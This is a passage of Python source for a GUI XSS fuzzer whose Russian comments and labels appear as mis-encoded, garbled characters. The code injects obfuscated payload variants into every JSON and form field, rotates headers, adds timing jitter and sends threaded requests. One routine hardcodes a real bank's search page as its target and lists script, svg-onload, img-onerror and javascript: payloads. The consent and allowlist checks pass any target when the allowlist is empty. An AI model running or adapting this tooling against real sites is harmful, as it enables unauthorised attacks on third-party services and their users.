        self.payload_text.pack(fill="both", expand=True, padx=10, pady=5)

        # ===== üß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π POST Fuzz =====
        post_fuzz_frame = ttk.LabelFrame(self, text="üß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π POST Fuzz")
        post_fuzz_frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(post_fuzz_frame, text="–¶–µ–ª–µ–≤–æ–π URL:").pack(side="left", padx=5)
        self.post_fuzz_url_entry = ttk.Entry(post_fuzz_frame, width=60)
        self.post_fuzz_url_entry.pack(side="left", padx=5)
        ttk.Button(post_fuzz_frame, text="üß™ –ó–∞–ø—É—Å—Ç–∏—Ç—å", command=self.run_post_xss_fuzzing).pack(side="left", padx=5)

        # ===== üìä –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã–µ XSS-—Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã =====
        context_frame = ttk.LabelFrame(self, text="üìä –ö–æ–Ω—Ç–µ–∫—Å—Ç XSS")
        context_frame.pack(fill="both", padx=10, pady=5, expand=True)

        context_table_frame = ttk.Frame(context_frame)
        context_table_frame.pack(fill="both", expand=True, padx=5, pady=5)

        context_scrollbar = ttk.Scrollbar(context_table_frame, orient="vertical")
        context_scrollbar.pack(side="right", fill="y")

        self.xss_context_tree = ttk.Treeview(
            context_table_frame,
            columns=("URL", "Context", "Category", "Suggested Payload"),
            show="headings",
            height=10,
            yscrollcommand=context_scrollbar.set,
        )
        for col in ("URL", "Context", "Category", "Suggested Payload"):
            self.xss_context_tree.heading(col, text=col)
            self.xss_context_tree.column(
                col,
                width=200 if col != "Suggested Payload" else 300,
                anchor="w",
            )

        self.xss_context_tree.pack(fill="both", expand=True)
        context_scrollbar.config(command=self.xss_context_tree.yview)

        self.xss_context_tree.tag_configure("reflected", background="#ffdddd")
        self.xss_context_tree.tag_configure("stored", background="#fff6cc")
        self.xss_context_tree.tag_configure("dom", background="#ddeaff")
        self.xss_context_tree.bind("<Double-1>", self.view_full_response)

    def bind_hotkeys(self) -> None:
        """–ü—Ä–∏–≤—è–∑–∫–∞ –≥–æ—Ä—è—á–∏—Ö –∫–ª–∞–≤–∏—à –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤–∫–ª–∞–¥–∫–æ–π."""
        try:
            self.bind_all("<Control-Return>", lambda e: self.start_xss_attack())
            self.bind_all("<F5>", lambda e: self.load_scan_results())
            self.bind_all("<Escape>", lambda e: self.quit_modal())
        except Exception as e:
            print(f"[‚ö†Ô∏è] –û—à–∏–±–∫–∞ –ø—Ä–∏–≤—è–∑–∫–∏ –≥–æ—Ä—è—á–∏—Ö –∫–ª–∞–≤–∏—à: {e}")

    def quit_modal(self) -> None:
        """–ó–∞–∫—Ä—ã–≤–∞–µ—Ç –≤—Å–µ –¥–æ—á–µ—Ä–Ω–∏–µ Toplevel-–æ–∫–Ω–∞ (–º–æ–¥–∞–ª—å–Ω—ã–µ –¥–∏–∞–ª–æ–≥–∏)."""
        for w in self.winfo_children():
            if isinstance(w, tk.Toplevel):
                w.destroy()

    def _require_consent(self) -> bool:
        """–ó–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º –∞–∫—Ç–∏–≤–Ω–æ–≥–æ —Ç–µ—Å—Ç–∞ (–µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–æ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö)."""
        if not self.safety.require_consent:
            return True
        return messagebox.askyesno("–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ", "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∑–∞–ø—É—Å–∫ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ —Ç–µ—Å—Ç–∞?")

    def _is_allowed_target(self, url: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —Ä–∞–∑—Ä–µ—à—ë–Ω –ª–∏ —Ü–µ–ª–µ–≤–æ–π URL —Å–æ–≥–ª–∞—Å–Ω–æ allowlist."""
        if not self.safety.allowlist:
            return True
        return any(str(url).startswith(prefix) for prefix in self.safety.allowlist)

    def get_headers(self) -> dict:
        """–§–æ—Ä–º–∏—Ä—É–µ—Ç –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è HTTP-–∑–∞–ø—Ä–æ—Å–∞ —Å —É—á—ë—Ç–æ–º —Ç–æ–∫–µ–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏."""
        headers = {"Content-Type": "application/json"}
        token = self.token_combo.get().strip() if hasattr(self, "token_combo") else ""
        if token and token != "‚Äî":
            headers["Authorization"] = f"Bearer {token}"
        return headers

    def get_timeout_rate(self) -> tuple[float, float]:
        """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç (timeout, rate_limit) –∏–∑ UI —Å –±–µ–∑–æ–ø–∞—Å–Ω—ã–º –ø–∞—Ä—Å–∏–Ω–≥–æ–º."""
        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = 8.0

        try:
            rate_limit = float(self.rate_spin.get())
        except Exception:
            rate_limit = 0.0

        return timeout, rate_limit

    def _parse_endpoint(self, raw: str) -> dict:
        """
        –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –∏ –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—è URL –∏–∑ —Å—Ç—Ä–æ–∫–∏ –∏–ª–∏ —Å–ª–æ–≤–∞—Ä—è.
        –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–¥–∞.
        """
        if not raw or raw == "‚Äî":
            raise ValueError("URL –Ω–µ —É–∫–∞–∑–∞–Ω")

        try:
            if raw.startswith("{"):
                endpoint = ast.literal_eval(raw)
            else:
                endpoint = {"url": raw}

            endpoint["url"] = normalize_url(endpoint["url"])
            return endpoint
        except (ValueError, SyntaxError) as e:
            raise ValueError(f"–ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –∏–∑–≤–ª–µ—á—å URL –∏–∑ '{raw}': {e}")

    def get_selected_url(self) -> str:
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –∏ –Ω–æ—Ä–º–∞–ª–∏–∑—É–µ—Ç URL –∏–∑ UI (api_combo –∏–ª–∏ full_url_entry)."""
        raw = self.api_combo.get().strip() or self.full_url_entry.get().strip()
        endpoint = self._parse_endpoint(raw)
        return endpoint["url"]

    def gui_logger(self, entry: dict) -> None:
        """–õ–æ–≥–∏—Ä—É–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç XSS/IDOR-–∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –≤ —á–µ–ª–æ–≤–µ–∫–æ—á–∏—Ç–∞–µ–º–æ–º –≤–∏–¥–µ."""
        if "error" in entry:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞: {entry['error']} ‚Üí {entry.get('url')}", level="error")
            return

        ctx = entry.get("context", "‚ùì")
        cat = entry.get("category", "‚Äî")
        payload = entry.get("payload", entry.get("suggested_payload", "‚Äî"))
        url = entry.get("url", "‚Äî")

        self.log(
            f"[üí•] {ctx} ‚Üí {url}\n"
            f"     –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {cat}\n"
            f"     Payload: {payload}"
        )

    def generate_xss_variants(
            self,
            url: str,
            params: dict | None,
            method: str,
    ):
        """
        –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç XSS-–≤–∞—Ä–∏–∞–Ω—Ç—ã —á–µ—Ä–µ–∑ XSSDetector.fuzz_xss_parameters.
        –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ URL (GET) –∏–ª–∏ —Å–ª–æ–≤–∞—Ä–µ–π {"url":..., "json":...} (POST).
        """
        try:
            detector = XSSDetector(threat_tab=self.threat_tab)

            variants = detector.fuzz_xss_parameters(
                base_url=url,
                payload_data=params,
                method=method,
            )
            self.log(f"[üß™] –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(variants)} XSS-–≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ ({method}).")
            return variants
        except Exception as e:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ XSS-–≤–∞—Ä–∏–∞–Ω—Ç–æ–≤: {e}", level="error")
            return []

    def view_full_response(self, event) -> None:
        """–û—Ç–∫—Ä—ã–≤–∞–µ—Ç –æ—Ç–¥–µ–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Å –ø–æ–ª–Ω—ã–º HTTP-–æ—Ç–≤–µ—Ç–æ–º –ø–æ –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∑–∞–ø–∏—Å–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ XSS."""
        selected = self.xss_context_tree.focus()
        if not selected:
            return

        # –°–Ω–∞—á–∞–ª–∞ –∏—â–µ–º –ø–æ _iid, –∑–∞—Ç–µ–º –ø–æ URL –∏–∑ –≤—ã–±—Ä–∞–Ω–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
        match = next((r for r in self.xss_results if r.get("_iid") == selected), None)
        if not match:
            try:
                values = self.xss_context_tree.item(selected, "values")
                url = values[0] if values and len(values) > 0 else None
                if url:
                    match = next(
                        (
                            r
                            for r in self.xss_results
                            if r.get("url") == url and "full_response" in r
                        ),
                        None,
                    )
            except Exception:
                match = None

        if match and "full_response" in match:
            url = match.get("url", "‚Äî")
            win = tk.Toplevel(self)
            win.title(f"üîç –û—Ç–≤–µ—Ç –æ—Ç {url}")
            win.geometry("1000x700")
            win.configure(bg="#202020")

            # –í–µ—Ä—Ö–Ω—è—è –ø–∞–Ω–µ–ª—å: –∫–Ω–æ–ø–∫–∏ "–°–æ—Ö—Ä–∞–Ω–∏—Ç—å" –∏ "–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å"
            top = ttk.Frame(win)
            top.pack(fill="x", padx=8, pady=6)

            ttk.Button(
                top,
                text="üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∫–∞–∫...",
                command=lambda: self._save_full_response(match["full_response"]),
            ).pack(side="left", padx=4)

            ttk.Button(
                top,
                text="üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å",
                command=lambda: win.clipboard_append(match["full_response"]),
            ).pack(side="left", padx=4)

            text = ScrolledText(
                win,
                wrap="word",
                bg="#1e1e1e",
                fg="#eaeaea",
                insertbackground="#eaeaea",
            )
            text.insert("1.0", match["full_response"])
            text.config(state="disabled")
            text.pack(fill="both", expand=True, padx=8, pady=8)

            # –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ Esc
            win.bind("<Escape>", lambda e: win.destroy())
        else:
            messagebox.showinfo("–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "–ü–æ–ª–Ω—ã–π –æ—Ç–≤–µ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")

    def _save_full_response(self, content: str) -> None:
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø–æ–ª–Ω—ã–π HTTP‚Äë–æ—Ç–≤–µ—Ç –≤ —Ñ–∞–π–ª —Å –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –∑–∞–ø–∏—Å—å—é —á–µ—Ä–µ–∑ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª."""
        try:
            path = filedialog.asksaveasfilename(
                title="–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø–æ–ª–Ω—ã–π –æ—Ç–≤–µ—Ç",
                defaultextension=".txt",
                filetypes=[
                    ("Text", "*.txt"),
                    ("HTML", "*.html"),
                    ("All", "*.*"),
                ],
            )
            if not path:
                return

            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            tmp = f"{path}.tmp"

            with open(tmp, "w", encoding="utf-8") as f:
                f.write(content)

            os.replace(tmp, path)
            self.log(f"[üíæ] –û—Ç–≤–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {path}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ñ–∞–π–ª:\n{e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: {e}", level="error")

    def run_post_xss_fuzzing(self) -> None:
        """
        –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π POST XSS‚Äë—Ñ—É–∑–∑–∏–Ω–≥:
        - –±–µ—Ä—ë—Ç –±–∞–∑–æ–≤—ã–π JSON –∏–∑ payload_box,
        - –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –º—É—Ç–∞—Ü–∏–∏ —Å XSS‚Äë–ø–µ–π–ª–æ–∞–¥–∞–º–∏,
        - –≥–æ—Ç–æ–≤–∏—Ç –∫–∞–∫ JSON, —Ç–∞–∫ –∏ form-urlencoded –≤–∞—Ä–∏–∞–Ω—Ç—ã.
        """
        if not self._require_consent():
            self.log("[‚ö†Ô∏è] –§—É–∑–∑–∏–Ω–≥ –æ—Ç–º–µ–Ω—ë–Ω: –Ω–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.", level="warning")
            return

        # === 1. –¶–µ–ª–µ–≤–æ–π URL –∏ allowlist ===
        url = self.post_fuzz_url_entry.get().strip() or (
            self.full_url_entry.get().strip() if hasattr(self, "full_url_entry") else ""
        )
        if not url:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏ —Ü–µ–ª–µ–≤–æ–π URL.")
            return

        url = normalize_url(url)
        if not self._is_allowed_target(url):
            self.log(
                "[‚ö†Ô∏è] –¶–µ–ª—å –Ω–µ –≤ allowlist. –î–æ–±–∞–≤—å –ø—Ä–µ—Ñ–∏–∫—Å –≤ SafetyConfig.allowlist.",
                level="warning",
            )
            return

        # === 2. –ó–∞–≥–æ–ª–æ–≤–∫–∏ –∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –æ–∫—Ä—É–∂–µ–Ω–∏—è ===
        headers = self.get_headers()
        timeout, rate_limit = self.get_timeout_rate()

        # –ê–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–µ –∫–æ–Ω—Ç–µ–Ω—Ç-—Ç–∏–ø—ã –∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏
        content_types = [
            "application/json",
            "application/json; charset=utf-8",
            "text/json",
            "application/x-www-form-urlencoded",
        ]
        ua_variants = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSSFuzz/1.0",
            "curl/7.79.1 (XSSFuzz)",
            f"SecurityTest/{self.safety.tester_id}",
        ]
        accept_all = [
            "*/*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        ]

        # === 3. –ò—Å—Ö–æ–¥–Ω—ã–π JSON ===
        try:
            payload_text = self.payload_box.get("1.0", "end").strip()
            base_json = json.loads(payload_text)
        except Exception:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π JSON –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞.")
            return

        # === 4. –ü–µ–π–ª–æ–∞–¥—ã ===
        category = self.category_combo.get()
        all_templates = gen_payloads_from_templates()
        payloads = all_templates.get(category, [])
        if not payloads:
            messagebox.showerror(
                "–û—à–∏–±–∫–∞",
                f"–ù–µ—Ç –ø–µ–π–ª–æ–∞–¥–æ–≤ –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ {category}.",
            )
            return

        # === 5. –ú—É—Ç–∞—Ü–∏–∏: —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–∞—è –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∞ + —É—Å–∏–ª–µ–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã ===
        def inject_payloads(base_data: Any, payload: str) -> list[tuple[str, Any, str, str]]:
            """
            –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –º—É—Ç–∞—Ü–∏–∏ JSON –∏ form-urlencoded.
            –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∫–æ—Ä—Ç–µ–∂–µ–π:
            - ("json", mutated_json, "path.to.field", payload_variant)
            - ("form", form_dict, "*", payload_variant)
            """
            mutations: list[tuple[str, Any, str, str]] = []

            # –£—Å–∏–ª–µ–Ω–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã (–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ + –ø–æ–ª–∏–º–æ—Ä—Ñ–∏–∑–º)
            variants = [payload] + generate_variants(payload)
            variants = variants[:20]  # –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ, —á—Ç–æ–±—ã –Ω–µ —Ä–∞–∑–¥—É–≤–∞—Ç—å —Ñ—É–∑–∑–∏–Ω–≥

            def recurse(obj: Any, path: list[str]) -> None:
                """–†–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ø–æ–¥—Å—Ç–∞–≤–ª—è–µ—Ç payload –≤–æ –≤—Å–µ —Å—Ç—Ä–æ–∫–æ–≤—ã–µ –ø–æ–ª—è."""
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        new_path = path + [k]

                        if isinstance(v, str):
                            for pv in variants:
                                mutated = copy.deepcopy(base_data)
                                target = mutated
                                for p in path:
                                    target = target[p]
                                target[k] = pv
                                mutations.append(
                                    ("json", mutated, ".".join(new_path), pv)
                                )

                        elif isinstance(v, (dict, list)):
                            recurse(v, new_path)

                elif isinstance(obj, list):
                    for idx, v in enumerate(obj):
                        new_path = path + [str(idx)]

                        if isinstance(v, str):
                            for pv in variants:
                                mutated = copy.deepcopy(base_data)
                                target = mutated
                                for p in path:
                                    target = target[p]
                                target[idx] = pv
                                mutations.append(
                                    ("json", mutated, ".".join(new_path), pv)
                                )

                        elif isinstance(v, (dict, list)):
                            recurse(v, new_path)

            # form-urlencoded –≤–∞—Ä–∏–∞–Ω—Ç—ã (–µ—Å–ª–∏ –∫–æ—Ä–µ–Ω—å ‚Äî dict)
            if isinstance(base_data, dict):
                for pv in variants:
                    try:
                        form = {
                            k: (pv if isinstance(v, str) else v)
                            for k, v in base_data.items()
                        }
                        mutations.append(("form", form, "*", pv))
                    except Exception:
                        # –Ω–µ —Ä–æ–Ω—è–µ–º —Ñ—É–∑–∑–∏–Ω–≥ –∏–∑-–∑–∞ –æ–¥–Ω–æ–π –Ω–µ—É–¥–∞—á–Ω–æ–π —Ñ–æ—Ä–º—ã
                        pass

            recurse(base_data, [])
            return mutations

        # === 6. –õ–æ–≥–∏ –∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ ===
        def _prepare_fuzz_output_dir() -> tuple[str, str]:
            os.makedirs("logs", exist_ok=True)
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            out_dir = os.path.join("logs", f"post_xss_fuzz_{ts}")
            os.makedirs(out_dir, exist_ok=True)
            return out_dir, os.path.join(out_dir, "summary.json")

        out_dir, summary_path = _prepare_fuzz_output_dir()
        results: list[dict] = []
        req_idx_ref = [0]

        # === 7. –°–æ–∑–¥–∞—ë–º session –ó–î–ï–°–¨ (PyCharm –±–æ–ª—å—à–µ –Ω–µ —Ä—É–≥–∞–µ—Ç—Å—è) ===
        session = create_retry_session(
            total=CONFIG["network"]["retry_total"],
            backoff=CONFIG["network"]["retry_backoff"],
            proxies=CONFIG["network"]["proxies"],
            timeout=timeout
        )

        # === 8. –û—Ç–ø—Ä–∞–≤–∫–∞ –æ–¥–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞ ===
        def _send_post_fuzz_request(
                session: requests.Session,
                url: str,
                headers: dict,
                timeout: float,
                rate_limit: float,
                accept_all: list[str],
                category: str,
                out_dir: str,
                kind: str,
                body: Any,
                param_path: str,
                pv: str,
                req_idx_ref: list[int]
        ) -> dict:

            with self._sem:
                req_idx_ref[0] += 1
                idx = req_idx_ref[0]

                # Rate limit / jitter
                if rate_limit > 0:
                    jitter = 0.7 + 0.6 * (os.urandom(1)[0] / 255)
                    time.sleep(max(0.0, 1.0 / rate_limit) * jitter)
                else:
                    self._bucket.wait()

                h = dict(headers)
                h["Accept"] = accept_all[idx % len(accept_all)]

                try:
                    if kind == "json":
                        resp = session.post(url, headers=h, json=body, timeout=timeout)
                    else:
                        resp = session.post(url, headers=h, data=body, timeout=timeout)

                    reflected = pv in resp.text
                    ctx = "üìú Reflected XSS" if reflected else "–ß–∏—Å—Ç–æ"

                    entry = {
                        "url": url,
                        "context": ctx,
                        "category": category,
                        "param": param_path,
                        "payload": pv,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "full_response": resp.text,
                    }

                    self.gui_logger(entry)

                    if hasattr(self, "xss_context_tree"):
                        tags = ("reflected",) if reflected else ()
                        self.xss_context_tree.insert(
                            "",
                            "end",
                            values=(url, ctx, "JSON" if kind == "json" else "FORM", pv),
                            tags=tags,
                        )

                    if reflected:
                        self.save_success(url, pv)
                        try:
                            start_honeypot()
                        except Exception as he:
                            self.log(f"[‚ö†] Honeypot error: {he}")

                    resp_file = os.path.join(out_dir, f"response_{idx:04d}.txt")
                    with open(resp_file, "w", encoding="utf-8") as f:
                        f.write(resp.text)

                    return {
                        "url": url,
                        "context": ctx,
                        "payload": pv,
                        "param": param_path,
                        "kind": kind,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "response_path": os.path.relpath(resp_file, out_dir),
                    }

                except Exception as e:
                    err = {
                        "error": str(e),
                        "url": url,
                        "payload": pv,
                        "param": param_path,
                        "kind": kind,
                    }
                    self.gui_logger(err)
                    return err

        # === 9. –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª ===
        threads: list[threading.Thread] = []

        for p in payloads:
            mutations = inject_payloads(base_json, p)

            for kind, body, param_path, pv in mutations:

                ct_list = content_types[:2] if kind == "json" else ["application/x-www-form-urlencoded"]

                for ct in ct_list:
                    h = dict(headers)
                    h["Content-Type"] = ct

                    ua = ua_variants[req_idx_ref[0] % len(ua_variants)] if ua_variants else None
                    if ua:
                        h["User-Agent"] = ua

                    t = threading.Thread(
                        target=_send_post_fuzz_request,
                        args=(
                            session,
                            url,
                            h,
                            timeout,
                            rate_limit,
                            accept_all,
                            category,
                            out_dir,
                            kind,
                            body,
                            param_path,
                            pv,
                            req_idx_ref
                        ),
                        daemon=True
                    )

                    threads.append(t)
                    t.start()

        # –û–∂–∏–¥–∞–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
        for t in threads:
            t.join()

        # === 10. –ò—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á—ë—Ç ===
        try:
            tmp = f"{summary_path}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "target": url,
                        "category": category,
                        "payload_count": len(payloads),
                        "request_count": req_idx_ref[0],
                        "timeout": timeout,
                        "rate_limit": rate_limit,
                        "results": results,
                    },
                    f,
                    indent=2,
                    ensure_ascii=False,
                )
            os.replace(tmp, summary_path)
            self.log(f"[üìÅ] –û—Ç—á—ë—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {summary_path}")
        except Exception as e:
            self.log(f"[‚ùå] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å summary.json: {e}")

        self.log(f"[‚úÖ] –§—É–∑–∑–∏–Ω–≥ –∑–∞–≤–µ—Ä—à—ë–Ω, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {req_idx_ref[0]} –∑–∞–ø—Ä–æ—Å–æ–≤.")

    def test_xss_payloads(self):
        """
        üöÄ –ê–≤—Ç–æ-–ø—Ä–æ–≤–µ—Ä–∫–∞ XSS-–ø–µ–π–ª–æ–∞–¥–æ–≤ –ø–æ —Å–ø–∏—Å–∫—É URL —Å –ø–∞—Ä–∞–ª–ª–µ–ª–∏–∑–º–æ–º, rate-limiting –∏ —É—Å—Ç–æ–π—á–∏–≤—ã–º —Å–µ—Ç–µ–≤—ã–º —Å–ª–æ–µ–º.
        –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç GET, –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –æ—Ç—Ä–∞–∂–µ–Ω–∏–µ, –ª–æ–≥–∏—Ä—É–µ—Ç, —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –æ—Ç–≤–µ—Ç—ã –∏ –∏—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á—ë—Ç –∞—Ç–æ–º–∞—Ä–Ω–æ.
        """
        # ===== 0. –ö–æ–Ω—Ç—Ä–æ–ª—å —Å–æ–≥–ª–∞—Å–∏—è –∏ allowlist =====
        if hasattr(self, "_require_consent") and not self._require_consent():
            self.log("[‚ö†Ô∏è] –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞: –Ω–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.")
            return

        def is_allowed(url: str) -> bool:
            if not hasattr(self, "safety") or not self.safety.allowlist:
                return True
            return any(url.startswith(p) for p in self.safety.allowlist)

        # ===== 1. –û—á–∏—Å—Ç–∫–∞ —Ç–∞–±–ª–∏—Ü =====
        for item in self.xss_tree.get_children():
            self.xss_tree.delete(item)

        # ===== 2. –°–µ—Ä–≤–∏—Å: –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—è –∏ —Å–µ—Å—Å–∏—è —Å —Ä–µ—Ç—Ä–∞—è–º–∏ =====
        def _normalize_url(u: str) -> str:
            u = u.strip()
            if not u.startswith(("http://", "https://")):
                u = "http://" + u
            return u

        def _create_session() -> requests.Session:
            retry = Retry(
                total=3,
                backoff_factor=0.7,
                status_forcelist=(429, 500, 502, 503, 504),
                allowed_methods=["GET"],
                raise_on_status=False,
                respect_retry_after_header=True,
            )
            adapter = HTTPAdapter(max_retries=retry)
            s = requests.Session()
            s.mount("http://", adapter)
            s.mount("https://", adapter)
            s.max_redirects = 5
            return s

        session = _create_session()

        # ===== 3. URL‚Äë—Å–ø–∏—Å–æ–∫ –∏ –≤–∞—Ä–∏–∞—Ç–∏–≤–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ =====
        base_targets = [
            "https://gazprombank.ru/?search=",  # –ø—Ä–∏–º–µ—Ä ‚Äî –∑–∞–º–µ–Ω–∏ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π URL
        ]

        if not base_targets:
            try:
                url_from_ui = self.get_selected_url()
                if url_from_ui:
                    base_targets = [url_from_ui]
            except ValueError:
                messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏—Ç–µ —Ü–µ–ª–µ–≤–æ–π URL –≤ –ø–æ–ª–µ API Endpoint –∏–ª–∏ –ü–æ–ª–Ω—ã–π URL")
                return

        base_targets = [_normalize_url(u) for u in base_targets]

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSSFuzz/2.0",
            "curl/8.0.1 (xss-audit)",
            "SecurityTest/1.1 (+test)",
        ]
        accepts = [
            "*/*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        ]

        # ===== 4. –ù–∞–±–æ—Ä –ø–µ–π–ª–æ–∞–¥–æ–≤ (–∞–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã) =====
        payloads = [
            '<script>alert(1)</script>',
            '"><svg/onload=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<math><mtext></mtext><script>alert(1)</script>",
            "<video><source onerror='alert(1)'>",
            "<marquee onstart=alert(1)>",
            "<svg onload=confirm(1)>",
            '<a href="javascript:alert(1)">click</a>',
            "\"><body onload=alert(1)>",
            "\"><input onfocus=alert(1) autofocus>",
        ]

        # ===== 5. UI: –∏–Ω—Ç–µ—Ä–≤–∞–ª, —Ç–∞–π–º–∞—É—Ç, rate =====
        try:
            interval = float(self.interval_entry.get())
        except Exception:
            interval = 1.0
        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = 8.0
        try:
            rate_limit = float(self.rate_spin.get())
        except Exception:
            rate_limit = 0.0

        # ===== 6. –õ–æ–≥–∏: –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫–∞—Ç–∞–ª–æ–≥–∞ =====
        os.makedirs("logs", exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = os.path.join("logs", f"xss_payload_test_{ts}")
        os.makedirs(out_dir, exist_ok=True)
        summary_path = os.path.join(out_dir, "summary.json")

        self.response_box.delete("1.0", "end")
        self.response_box.insert("end", "üöÄ –ó–∞–ø—É—Å–∫ XSS‚Äë–ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ —Å–ø–∏—Å–∫—É URL:\n\n")

